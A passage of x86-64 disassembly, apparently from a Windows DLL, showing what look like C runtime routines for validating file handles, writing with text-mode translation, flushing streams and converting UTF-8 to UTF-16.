   18000d174:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   18000d178:	49 8b e3             	mov    %r11,%rsp
   18000d17b:	41 5f                	pop    %r15
   18000d17d:	41 5e                	pop    %r14
   18000d17f:	41 5c                	pop    %r12
   18000d181:	5f                   	pop    %rdi
   18000d182:	5e                   	pop    %rsi
   18000d183:	c3                   	ret
   18000d184:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000d189:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000d18e:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   18000d192:	57                   	push   %rdi
   18000d193:	41 54                	push   %r12
   18000d195:	41 55                	push   %r13
   18000d197:	41 56                	push   %r14
   18000d199:	41 57                	push   %r15
   18000d19b:	48 83 ec 20          	sub    $0x20,%rsp
   18000d19f:	45 8b f0             	mov    %r8d,%r14d
   18000d1a2:	4c 8b fa             	mov    %rdx,%r15
   18000d1a5:	48 63 d9             	movslq %ecx,%rbx
   18000d1a8:	83 fb fe             	cmp    $0xfffffffe,%ebx
   18000d1ab:	75 18                	jne    0x18000d1c5
   18000d1ad:	e8 2a b0 ff ff       	call   0x1800081dc
   18000d1b2:	83 20 00             	andl   $0x0,(%rax)
   18000d1b5:	e8 42 b0 ff ff       	call   0x1800081fc
   18000d1ba:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000d1c0:	e9 8f 00 00 00       	jmp    0x18000d254
   18000d1c5:	85 c9                	test   %ecx,%ecx
   18000d1c7:	78 73                	js     0x18000d23c
   18000d1c9:	3b 1d 61 ea 00 00    	cmp    0xea61(%rip),%ebx        # 0x18001bc30
   18000d1cf:	73 6b                	jae    0x18000d23c
   18000d1d1:	48 8b c3             	mov    %rbx,%rax
   18000d1d4:	48 8b f3             	mov    %rbx,%rsi
   18000d1d7:	48 c1 fe 06          	sar    $0x6,%rsi
   18000d1db:	4c 8d 2d 4e e6 00 00 	lea    0xe64e(%rip),%r13        # 0x18001b830
   18000d1e2:	83 e0 3f             	and    $0x3f,%eax
   18000d1e5:	4c 8d 24 c0          	lea    (%rax,%rax,8),%r12
   18000d1e9:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   18000d1ee:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   18000d1f4:	74 46                	je     0x18000d23c
   18000d1f6:	8b cb                	mov    %ebx,%ecx
   18000d1f8:	e8 67 f4 ff ff       	call   0x18000c664
   18000d1fd:	83 cf ff             	or     $0xffffffff,%edi
   18000d200:	49 8b 44 f5 00       	mov    0x0(%r13,%rsi,8),%rax
   18000d205:	42 f6 44 e0 38 01    	testb  $0x1,0x38(%rax,%r12,8)
   18000d20b:	75 15                	jne    0x18000d222
   18000d20d:	e8 ea af ff ff       	call   0x1800081fc
   18000d212:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000d218:	e8 bf af ff ff       	call   0x1800081dc
   18000d21d:	83 20 00             	andl   $0x0,(%rax)
   18000d220:	eb 0f                	jmp    0x18000d231
   18000d222:	45 8b c6             	mov    %r14d,%r8d
   18000d225:	49 8b d7             	mov    %r15,%rdx
   18000d228:	8b cb                	mov    %ebx,%ecx
   18000d22a:	e8 41 00 00 00       	call   0x18000d270
   18000d22f:	8b f8                	mov    %eax,%edi
   18000d231:	8b cb                	mov    %ebx,%ecx
   18000d233:	e8 54 f4 ff ff       	call   0x18000c68c
   18000d238:	8b c7                	mov    %edi,%eax
   18000d23a:	eb 1b                	jmp    0x18000d257
   18000d23c:	e8 9b af ff ff       	call   0x1800081dc
   18000d241:	83 20 00             	andl   $0x0,(%rax)
   18000d244:	e8 b3 af ff ff       	call   0x1800081fc
   18000d249:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000d24f:	e8 e8 93 ff ff       	call   0x18000663c
   18000d254:	83 c8 ff             	or     $0xffffffff,%eax
   18000d257:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   18000d25c:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   18000d261:	48 83 c4 20          	add    $0x20,%rsp
   18000d265:	41 5f                	pop    %r15
   18000d267:	41 5e                	pop    %r14
   18000d269:	41 5d                	pop    %r13
   18000d26b:	41 5c                	pop    %r12
   18000d26d:	5f                   	pop    %rdi
   18000d26e:	c3                   	ret
   18000d26f:	cc                   	int3
   18000d270:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000d275:	55                   	push   %rbp
   18000d276:	56                   	push   %rsi
   18000d277:	57                   	push   %rdi
   18000d278:	41 54                	push   %r12
   18000d27a:	41 55                	push   %r13
   18000d27c:	41 56                	push   %r14
   18000d27e:	41 57                	push   %r15
   18000d280:	48 8b ec             	mov    %rsp,%rbp
   18000d283:	48 83 ec 60          	sub    $0x60,%rsp
   18000d287:	33 db                	xor    %ebx,%ebx
   18000d289:	45 8b f0             	mov    %r8d,%r14d
   18000d28c:	4c 63 e1             	movslq %ecx,%r12
   18000d28f:	48 8b fa             	mov    %rdx,%rdi
   18000d292:	45 85 c0             	test   %r8d,%r8d
   18000d295:	0f 84 9e 02 00 00    	je     0x18000d539
   18000d29b:	48 85 d2             	test   %rdx,%rdx
   18000d29e:	75 1f                	jne    0x18000d2bf
   18000d2a0:	e8 37 af ff ff       	call   0x1800081dc
   18000d2a5:	89 18                	mov    %ebx,(%rax)
   18000d2a7:	e8 50 af ff ff       	call   0x1800081fc
   18000d2ac:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000d2b2:	e8 85 93 ff ff       	call   0x18000663c
   18000d2b7:	83 c8 ff             	or     $0xffffffff,%eax
   18000d2ba:	e9 7c 02 00 00       	jmp    0x18000d53b
   18000d2bf:	49 8b c4             	mov    %r12,%rax
   18000d2c2:	48 8d 0d 67 e5 00 00 	lea    0xe567(%rip),%rcx        # 0x18001b830
   18000d2c9:	83 e0 3f             	and    $0x3f,%eax
   18000d2cc:	4d 8b ec             	mov    %r12,%r13
   18000d2cf:	49 c1 fd 06          	sar    $0x6,%r13
   18000d2d3:	4c 8d 3c c0          	lea    (%rax,%rax,8),%r15
   18000d2d7:	4a 8b 0c e9          	mov    (%rcx,%r13,8),%rcx
   18000d2db:	42 0f be 74 f9 39    	movsbl 0x39(%rcx,%r15,8),%esi
   18000d2e1:	8d 46 ff             	lea    -0x1(%rsi),%eax
   18000d2e4:	3c 01                	cmp    $0x1,%al
   18000d2e6:	77 09                	ja     0x18000d2f1
   18000d2e8:	41 8b c6             	mov    %r14d,%eax
   18000d2eb:	f7 d0                	not    %eax
   18000d2ed:	a8 01                	test   $0x1,%al
   18000d2ef:	74 af                	je     0x18000d2a0
   18000d2f1:	42 f6 44 f9 38 20    	testb  $0x20,0x38(%rcx,%r15,8)
   18000d2f7:	74 0e                	je     0x18000d307
   18000d2f9:	33 d2                	xor    %edx,%edx
   18000d2fb:	41 8b cc             	mov    %r12d,%ecx
   18000d2fe:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   18000d302:	e8 81 09 00 00       	call   0x18000dc88
   18000d307:	41 8b cc             	mov    %r12d,%ecx
   18000d30a:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   18000d30e:	e8 35 03 00 00       	call   0x18000d648
   18000d313:	85 c0                	test   %eax,%eax
   18000d315:	0f 84 0b 01 00 00    	je     0x18000d426
   18000d31b:	48 8d 05 0e e5 00 00 	lea    0xe50e(%rip),%rax        # 0x18001b830
   18000d322:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   18000d326:	42 38 5c f8 38       	cmp    %bl,0x38(%rax,%r15,8)
   18000d32b:	0f 8d f5 00 00 00    	jge    0x18000d426
   18000d331:	e8 72 aa ff ff       	call   0x180007da8
   18000d336:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   18000d33d:	48 39 99 38 01 00 00 	cmp    %rbx,0x138(%rcx)
   18000d344:	75 16                	jne    0x18000d35c
   18000d346:	48 8d 05 e3 e4 00 00 	lea    0xe4e3(%rip),%rax        # 0x18001b830
   18000d34d:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   18000d351:	42 38 5c f8 39       	cmp    %bl,0x39(%rax,%r15,8)
   18000d356:	0f 84 ca 00 00 00    	je     0x18000d426
   18000d35c:	48 8d 05 cd e4 00 00 	lea    0xe4cd(%rip),%rax        # 0x18001b830
   18000d363:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   18000d367:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   18000d36b:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   18000d370:	ff 15 a2 2e 00 00    	call   *0x2ea2(%rip)        # 0x180010218
   18000d376:	85 c0                	test   %eax,%eax
   18000d378:	0f 84 a8 00 00 00    	je     0x18000d426
   18000d37e:	40 84 f6             	test   %sil,%sil
   18000d381:	0f 84 81 00 00 00    	je     0x18000d408
   18000d387:	40 fe ce             	dec    %sil
   18000d38a:	40 80 fe 01          	cmp    $0x1,%sil
   18000d38e:	0f 87 2e 01 00 00    	ja     0x18000d4c2
   18000d394:	4e 8d 24 37          	lea    (%rdi,%r14,1),%r12
   18000d398:	48 89 5d d0          	mov    %rbx,-0x30(%rbp)
   18000d39c:	4c 8b f7             	mov    %rdi,%r14
   18000d39f:	49 3b fc             	cmp    %r12,%rdi
   18000d3a2:	0f 83 10 01 00 00    	jae    0x18000d4b8
   18000d3a8:	8b 75 d4             	mov    -0x2c(%rbp),%esi
   18000d3ab:	41 0f b7 06          	movzwl (%r14),%eax
   18000d3af:	0f b7 c8             	movzwl %ax,%ecx
   18000d3b2:	66 89 45 f0          	mov    %ax,-0x10(%rbp)
   18000d3b6:	e8 d5 08 00 00       	call   0x18000dc90
   18000d3bb:	0f b7 4d f0          	movzwl -0x10(%rbp),%ecx
   18000d3bf:	66 3b c1             	cmp    %cx,%ax
   18000d3c2:	75 36                	jne    0x18000d3fa
   18000d3c4:	83 c6 02             	add    $0x2,%esi
   18000d3c7:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   18000d3ca:	66 83 f9 0a          	cmp    $0xa,%cx
   18000d3ce:	75 1b                	jne    0x18000d3eb
   18000d3d0:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18000d3d5:	e8 b6 08 00 00       	call   0x18000dc90
   18000d3da:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18000d3df:	66 3b c1             	cmp    %cx,%ax
   18000d3e2:	75 16                	jne    0x18000d3fa
   18000d3e4:	ff c6                	inc    %esi
   18000d3e6:	89 75 d4             	mov    %esi,-0x2c(%rbp)
   18000d3e9:	ff c3                	inc    %ebx
   18000d3eb:	49 83 c6 02          	add    $0x2,%r14
   18000d3ef:	4d 3b f4             	cmp    %r12,%r14
   18000d3f2:	0f 83 c0 00 00 00    	jae    0x18000d4b8
   18000d3f8:	eb b1                	jmp    0x18000d3ab
   18000d3fa:	ff 15 c0 2c 00 00    	call   *0x2cc0(%rip)        # 0x1800100c0
   18000d400:	89 45 d0             	mov    %eax,-0x30(%rbp)
   18000d403:	e9 b0 00 00 00       	jmp    0x18000d4b8
   18000d408:	45 8b ce             	mov    %r14d,%r9d
   18000d40b:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000d40f:	4c 8b c7             	mov    %rdi,%r8
   18000d412:	41 8b d4             	mov    %r12d,%edx
   18000d415:	e8 ee f4 ff ff       	call   0x18000c908
   18000d41a:	f2 0f 10 00          	movsd  (%rax),%xmm0
   18000d41e:	8b 58 08             	mov    0x8(%rax),%ebx
   18000d421:	e9 97 00 00 00       	jmp    0x18000d4bd
   18000d426:	48 8d 05 03 e4 00 00 	lea    0xe403(%rip),%rax        # 0x18001b830
   18000d42d:	4a 8b 0c e8          	mov    (%rax,%r13,8),%rcx
   18000d431:	42 38 5c f9 38       	cmp    %bl,0x38(%rcx,%r15,8)
   18000d436:	7d 4d                	jge    0x18000d485
   18000d438:	8b ce                	mov    %esi,%ecx
   18000d43a:	40 84 f6             	test   %sil,%sil
   18000d43d:	74 32                	je     0x18000d471
   18000d43f:	83 e9 01             	sub    $0x1,%ecx
   18000d442:	74 19                	je     0x18000d45d
   18000d444:	83 f9 01             	cmp    $0x1,%ecx
   18000d447:	75 79                	jne    0x18000d4c2
   18000d449:	45 8b ce             	mov    %r14d,%r9d
   18000d44c:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000d450:	4c 8b c7             	mov    %rdi,%r8
   18000d453:	41 8b d4             	mov    %r12d,%edx
   18000d456:	e8 9d fa ff ff       	call   0x18000cef8
   18000d45b:	eb bd                	jmp    0x18000d41a
   18000d45d:	45 8b ce             	mov    %r14d,%r9d
   18000d460:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000d464:	4c 8b c7             	mov    %rdi,%r8
   18000d467:	41 8b d4             	mov    %r12d,%edx
   18000d46a:	e8 a5 fb ff ff       	call   0x18000d014
   18000d46f:	eb a9                	jmp    0x18000d41a
   18000d471:	45 8b ce             	mov    %r14d,%r9d
   18000d474:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   18000d478:	4c 8b c7             	mov    %rdi,%r8
   18000d47b:	41 8b d4             	mov    %r12d,%edx
   18000d47e:	e8 71 f9 ff ff       	call   0x18000cdf4
   18000d483:	eb 95                	jmp    0x18000d41a
   18000d485:	4a 8b 4c f9 28       	mov    0x28(%rcx,%r15,8),%rcx
   18000d48a:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   18000d48e:	33 c0                	xor    %eax,%eax
   18000d490:	45 8b c6             	mov    %r14d,%r8d
   18000d493:	48 21 44 24 20       	and    %rax,0x20(%rsp)
   18000d498:	48 8b d7             	mov    %rdi,%rdx
   18000d49b:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   18000d49f:	89 45 d8             	mov    %eax,-0x28(%rbp)
   18000d4a2:	ff 15 60 2d 00 00    	call   *0x2d60(%rip)        # 0x180010208
   18000d4a8:	85 c0                	test   %eax,%eax
   18000d4aa:	75 09                	jne    0x18000d4b5
   18000d4ac:	ff 15 0e 2c 00 00    	call   *0x2c0e(%rip)        # 0x1800100c0
   18000d4b2:	89 45 d0             	mov    %eax,-0x30(%rbp)
   18000d4b5:	8b 5d d8             	mov    -0x28(%rbp),%ebx
   18000d4b8:	f2 0f 10 45 d0       	movsd  -0x30(%rbp),%xmm0
   18000d4bd:	f2 0f 11 45 e0       	movsd  %xmm0,-0x20(%rbp)
   18000d4c2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   18000d4c6:	48 c1 e8 20          	shr    $0x20,%rax
   18000d4ca:	85 c0                	test   %eax,%eax
   18000d4cc:	75 64                	jne    0x18000d532
   18000d4ce:	8b 45 e0             	mov    -0x20(%rbp),%eax
   18000d4d1:	85 c0                	test   %eax,%eax
   18000d4d3:	74 2d                	je     0x18000d502
   18000d4d5:	83 f8 05             	cmp    $0x5,%eax
   18000d4d8:	75 1b                	jne    0x18000d4f5
   18000d4da:	e8 1d ad ff ff       	call   0x1800081fc
   18000d4df:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000d4e5:	e8 f2 ac ff ff       	call   0x1800081dc
   18000d4ea:	c7 00 05 00 00 00    	movl   $0x5,(%rax)
   18000d4f0:	e9 c2 fd ff ff       	jmp    0x18000d2b7
   18000d4f5:	8b 4d e0             	mov    -0x20(%rbp),%ecx
   18000d4f8:	e8 8f ac ff ff       	call   0x18000818c
   18000d4fd:	e9 b5 fd ff ff       	jmp    0x18000d2b7
   18000d502:	48 8d 05 27 e3 00 00 	lea    0xe327(%rip),%rax        # 0x18001b830
   18000d509:	4a 8b 04 e8          	mov    (%rax,%r13,8),%rax
   18000d50d:	42 f6 44 f8 38 40    	testb  $0x40,0x38(%rax,%r15,8)
   18000d513:	74 05                	je     0x18000d51a
   18000d515:	80 3f 1a             	cmpb   $0x1a,(%rdi)
   18000d518:	74 1f                	je     0x18000d539
   18000d51a:	e8 dd ac ff ff       	call   0x1800081fc
   18000d51f:	c7 00 1c 00 00 00    	movl   $0x1c,(%rax)
   18000d525:	e8 b2 ac ff ff       	call   0x1800081dc
   18000d52a:	83 20 00             	andl   $0x0,(%rax)
   18000d52d:	e9 85 fd ff ff       	jmp    0x18000d2b7
   18000d532:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   18000d535:	2b c3                	sub    %ebx,%eax
   18000d537:	eb 02                	jmp    0x18000d53b
   18000d539:	33 c0                	xor    %eax,%eax
   18000d53b:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   18000d542:	00 
   18000d543:	48 83 c4 60          	add    $0x60,%rsp
   18000d547:	41 5f                	pop    %r15
   18000d549:	41 5e                	pop    %r14
   18000d54b:	41 5d                	pop    %r13
   18000d54d:	41 5c                	pop    %r12
   18000d54f:	5f                   	pop    %rdi
   18000d550:	5e                   	pop    %rsi
   18000d551:	5d                   	pop    %rbp
   18000d552:	c3                   	ret
   18000d553:	cc                   	int3
   18000d554:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000d559:	57                   	push   %rdi
   18000d55a:	48 83 ec 30          	sub    $0x30,%rsp
   18000d55e:	83 64 24 20 00       	andl   $0x0,0x20(%rsp)
   18000d563:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000d568:	e8 2b ab ff ff       	call   0x180008098
   18000d56d:	90                   	nop
   18000d56e:	bb 03 00 00 00       	mov    $0x3,%ebx
   18000d573:	89 5c 24 24          	mov    %ebx,0x24(%rsp)
   18000d577:	3b 1d eb e6 00 00    	cmp    0xe6eb(%rip),%ebx        # 0x18001bc68
   18000d57d:	74 6d                	je     0x18000d5ec
   18000d57f:	48 63 fb             	movslq %ebx,%rdi
   18000d582:	48 8b 05 e7 e6 00 00 	mov    0xe6e7(%rip),%rax        # 0x18001bc70
   18000d589:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   18000d58d:	48 85 c9             	test   %rcx,%rcx
   18000d590:	75 02                	jne    0x18000d594
   18000d592:	eb 54                	jmp    0x18000d5e8
   18000d594:	8b 41 14             	mov    0x14(%rcx),%eax
   18000d597:	c1 e8 0d             	shr    $0xd,%eax
   18000d59a:	a8 01                	test   $0x1,%al
   18000d59c:	74 19                	je     0x18000d5b7
   18000d59e:	48 8b 0d cb e6 00 00 	mov    0xe6cb(%rip),%rcx        # 0x18001bc70
   18000d5a5:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   18000d5a9:	e8 a2 07 00 00       	call   0x18000dd50
   18000d5ae:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000d5b1:	74 04                	je     0x18000d5b7
   18000d5b3:	ff 44 24 20          	incl   0x20(%rsp)
   18000d5b7:	48 8b 05 b2 e6 00 00 	mov    0xe6b2(%rip),%rax        # 0x18001bc70
   18000d5be:	48 8b 0c f8          	mov    (%rax,%rdi,8),%rcx
   18000d5c2:	48 83 c1 30          	add    $0x30,%rcx
   18000d5c6:	ff 15 1c 2b 00 00    	call   *0x2b1c(%rip)        # 0x1800100e8
   18000d5cc:	48 8b 0d 9d e6 00 00 	mov    0xe69d(%rip),%rcx        # 0x18001bc70
   18000d5d3:	48 8b 0c f9          	mov    (%rcx,%rdi,8),%rcx
   18000d5d7:	e8 b8 ac ff ff       	call   0x180008294
   18000d5dc:	48 8b 05 8d e6 00 00 	mov    0xe68d(%rip),%rax        # 0x18001bc70
   18000d5e3:	48 83 24 f8 00       	andq   $0x0,(%rax,%rdi,8)
   18000d5e8:	ff c3                	inc    %ebx
   18000d5ea:	eb 87                	jmp    0x18000d573
   18000d5ec:	b9 08 00 00 00       	mov    $0x8,%ecx
   18000d5f1:	e8 f6 aa ff ff       	call   0x1800080ec
   18000d5f6:	8b 44 24 20          	mov    0x20(%rsp),%eax
   18000d5fa:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000d5ff:	48 83 c4 30          	add    $0x30,%rsp
   18000d603:	5f                   	pop    %rdi
   18000d604:	c3                   	ret
   18000d605:	cc                   	int3
   18000d606:	cc                   	int3
   18000d607:	cc                   	int3
   18000d608:	40 53                	rex push %rbx
   18000d60a:	48 83 ec 20          	sub    $0x20,%rsp
   18000d60e:	8b 41 14             	mov    0x14(%rcx),%eax
   18000d611:	48 8b d9             	mov    %rcx,%rbx
   18000d614:	c1 e8 0d             	shr    $0xd,%eax
   18000d617:	a8 01                	test   $0x1,%al
   18000d619:	74 27                	je     0x18000d642
   18000d61b:	8b 41 14             	mov    0x14(%rcx),%eax
   18000d61e:	c1 e8 06             	shr    $0x6,%eax
   18000d621:	a8 01                	test   $0x1,%al
   18000d623:	74 1d                	je     0x18000d642
   18000d625:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   18000d629:	e8 66 ac ff ff       	call   0x180008294
   18000d62e:	f0 81 63 14 bf fe ff 	lock andl $0xfffffebf,0x14(%rbx)
   18000d635:	ff 
   18000d636:	33 c0                	xor    %eax,%eax
   18000d638:	48 89 43 08          	mov    %rax,0x8(%rbx)
   18000d63c:	48 89 03             	mov    %rax,(%rbx)
   18000d63f:	89 43 10             	mov    %eax,0x10(%rbx)
   18000d642:	48 83 c4 20          	add    $0x20,%rsp
   18000d646:	5b                   	pop    %rbx
   18000d647:	c3                   	ret
   18000d648:	48 83 ec 28          	sub    $0x28,%rsp
   18000d64c:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   18000d64f:	75 0d                	jne    0x18000d65e
   18000d651:	e8 a6 ab ff ff       	call   0x1800081fc
   18000d656:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000d65c:	eb 42                	jmp    0x18000d6a0
   18000d65e:	85 c9                	test   %ecx,%ecx
   18000d660:	78 2e                	js     0x18000d690
   18000d662:	3b 0d c8 e5 00 00    	cmp    0xe5c8(%rip),%ecx        # 0x18001bc30
   18000d668:	73 26                	jae    0x18000d690
   18000d66a:	48 63 c9             	movslq %ecx,%rcx
   18000d66d:	48 8d 15 bc e1 00 00 	lea    0xe1bc(%rip),%rdx        # 0x18001b830
   18000d674:	48 8b c1             	mov    %rcx,%rax
   18000d677:	83 e1 3f             	and    $0x3f,%ecx
   18000d67a:	48 c1 f8 06          	sar    $0x6,%rax
   18000d67e:	48 8d 0c c9          	lea    (%rcx,%rcx,8),%rcx
   18000d682:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   18000d686:	0f b6 44 c8 38       	movzbl 0x38(%rax,%rcx,8),%eax
   18000d68b:	83 e0 40             	and    $0x40,%eax
   18000d68e:	eb 12                	jmp    0x18000d6a2
   18000d690:	e8 67 ab ff ff       	call   0x1800081fc
   18000d695:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   18000d69b:	e8 9c 8f ff ff       	call   0x18000663c
   18000d6a0:	33 c0                	xor    %eax,%eax
   18000d6a2:	48 83 c4 28          	add    $0x28,%rsp
   18000d6a6:	c3                   	ret
   18000d6a7:	cc                   	int3
   18000d6a8:	40 53                	rex push %rbx
   18000d6aa:	48 83 ec 40          	sub    $0x40,%rsp
   18000d6ae:	48 63 d9             	movslq %ecx,%rbx
   18000d6b1:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000d6b6:	e8 d9 a1 ff ff       	call   0x180007894
   18000d6bb:	8d 43 01             	lea    0x1(%rbx),%eax
   18000d6be:	3d 00 01 00 00       	cmp    $0x100,%eax
   18000d6c3:	77 13                	ja     0x18000d6d8
   18000d6c5:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   18000d6ca:	48 8b 08             	mov    (%rax),%rcx
   18000d6cd:	0f b7 04 59          	movzwl (%rcx,%rbx,2),%eax
   18000d6d1:	25 00 80 00 00       	and    $0x8000,%eax
   18000d6d6:	eb 02                	jmp    0x18000d6da
   18000d6d8:	33 c0                	xor    %eax,%eax
   18000d6da:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   18000d6df:	74 0c                	je     0x18000d6ed
   18000d6e1:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   18000d6e6:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   18000d6ed:	48 83 c4 40          	add    $0x40,%rsp
   18000d6f1:	5b                   	pop    %rbx
   18000d6f2:	c3                   	ret
   18000d6f3:	cc                   	int3
   18000d6f4:	40 53                	rex push %rbx
   18000d6f6:	48 83 ec 30          	sub    $0x30,%rsp
   18000d6fa:	48 8b d9             	mov    %rcx,%rbx
   18000d6fd:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000d702:	e8 ad 06 00 00       	call   0x18000ddb4
   18000d707:	48 83 f8 04          	cmp    $0x4,%rax
   18000d70b:	77 1a                	ja     0x18000d727
   18000d70d:	8b 54 24 20          	mov    0x20(%rsp),%edx
   18000d711:	b9 fd ff 00 00       	mov    $0xfffd,%ecx
   18000d716:	81 fa ff ff 00 00    	cmp    $0xffff,%edx
   18000d71c:	0f 47 d1             	cmova  %ecx,%edx
   18000d71f:	48 85 db             	test   %rbx,%rbx
   18000d722:	74 03                	je     0x18000d727
   18000d724:	66 89 13             	mov    %dx,(%rbx)
   18000d727:	48 83 c4 30          	add    $0x30,%rsp
   18000d72b:	5b                   	pop    %rbx
   18000d72c:	c3                   	ret
   18000d72d:	cc                   	int3
   18000d72e:	cc                   	int3
   18000d72f:	cc                   	int3
   18000d730:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000d735:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000d73a:	57                   	push   %rdi
   18000d73b:	41 54                	push   %r12
   18000d73d:	41 55                	push   %r13
   18000d73f:	41 56                	push   %r14
   18000d741:	41 57                	push   %r15
   18000d743:	48 83 ec 20          	sub    $0x20,%rsp
   18000d747:	48 8b 3a             	mov    (%rdx),%rdi
   18000d74a:	45 33 ed             	xor    %r13d,%r13d
   18000d74d:	4d 8b e1             	mov    %r9,%r12
   18000d750:	49 8b e8             	mov    %r8,%rbp
   18000d753:	4c 8b f2             	mov    %rdx,%r14
   18000d756:	4c 8b f9             	mov    %rcx,%r15
   18000d759:	48 85 c9             	test   %rcx,%rcx
   18000d75c:	0f 84 ee 00 00 00    	je     0x18000d850
   18000d762:	48 8b d9             	mov    %rcx,%rbx
   18000d765:	4d 85 c0             	test   %r8,%r8
   18000d768:	0f 84 a1 00 00 00    	je     0x18000d80f
   18000d76e:	44 38 2f             	cmp    %r13b,(%rdi)
   18000d771:	75 08                	jne    0x18000d77b
   18000d773:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000d779:	eb 1d                	jmp    0x18000d798
   18000d77b:	44 38 6f 01          	cmp    %r13b,0x1(%rdi)
   18000d77f:	75 08                	jne    0x18000d789
   18000d781:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   18000d787:	eb 0f                	jmp    0x18000d798
   18000d789:	8a 47 02             	mov    0x2(%rdi),%al
   18000d78c:	f6 d8                	neg    %al
   18000d78e:	4d 1b c0             	sbb    %r8,%r8
   18000d791:	49 f7 d8             	neg    %r8
   18000d794:	49 83 c0 03          	add    $0x3,%r8
   18000d798:	4d 8b cc             	mov    %r12,%r9
   18000d79b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000d7a0:	48 8b d7             	mov    %rdi,%rdx
   18000d7a3:	e8 0c 06 00 00       	call   0x18000ddb4
   18000d7a8:	48 8b d0             	mov    %rax,%rdx
   18000d7ab:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000d7af:	74 75                	je     0x18000d826
   18000d7b1:	48 85 c0             	test   %rax,%rax
   18000d7b4:	74 67                	je     0x18000d81d
   18000d7b6:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   18000d7ba:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
   18000d7c0:	76 39                	jbe    0x18000d7fb
   18000d7c2:	48 83 fd 01          	cmp    $0x1,%rbp
   18000d7c6:	76 47                	jbe    0x18000d80f
   18000d7c8:	81 c1 00 00 ff ff    	add    $0xffff0000,%ecx
   18000d7ce:	41 b8 00 d8 00 00    	mov    $0xd800,%r8d
   18000d7d4:	8b c1                	mov    %ecx,%eax
   18000d7d6:	89 4c 24 50          	mov    %ecx,0x50(%rsp)
   18000d7da:	c1 e8 0a             	shr    $0xa,%eax
   18000d7dd:	48 ff cd             	dec    %rbp
   18000d7e0:	66 41 0b c0          	or     %r8w,%ax
   18000d7e4:	66 89 03             	mov    %ax,(%rbx)
   18000d7e7:	b8 ff 03 00 00       	mov    $0x3ff,%eax
   18000d7ec:	66 23 c8             	and    %ax,%cx
   18000d7ef:	48 83 c3 02          	add    $0x2,%rbx
   18000d7f3:	b8 00 dc 00 00       	mov    $0xdc00,%eax
   18000d7f8:	66 0b c8             	or     %ax,%cx
   18000d7fb:	66 89 0b             	mov    %cx,(%rbx)
   18000d7fe:	48 03 fa             	add    %rdx,%rdi
   18000d801:	48 83 c3 02          	add    $0x2,%rbx
   18000d805:	48 83 ed 01          	sub    $0x1,%rbp
   18000d809:	0f 85 5f ff ff ff    	jne    0x18000d76e
   18000d80f:	49 2b df             	sub    %r15,%rbx
   18000d812:	49 89 3e             	mov    %rdi,(%r14)
   18000d815:	48 d1 fb             	sar    $1,%rbx
   18000d818:	48 8b c3             	mov    %rbx,%rax
   18000d81b:	eb 1b                	jmp    0x18000d838
   18000d81d:	49 8b fd             	mov    %r13,%rdi
   18000d820:	66 44 89 2b          	mov    %r13w,(%rbx)
   18000d824:	eb e9                	jmp    0x18000d80f
   18000d826:	49 89 3e             	mov    %rdi,(%r14)
   18000d829:	e8 ce a9 ff ff       	call   0x1800081fc
   18000d82e:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   18000d834:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
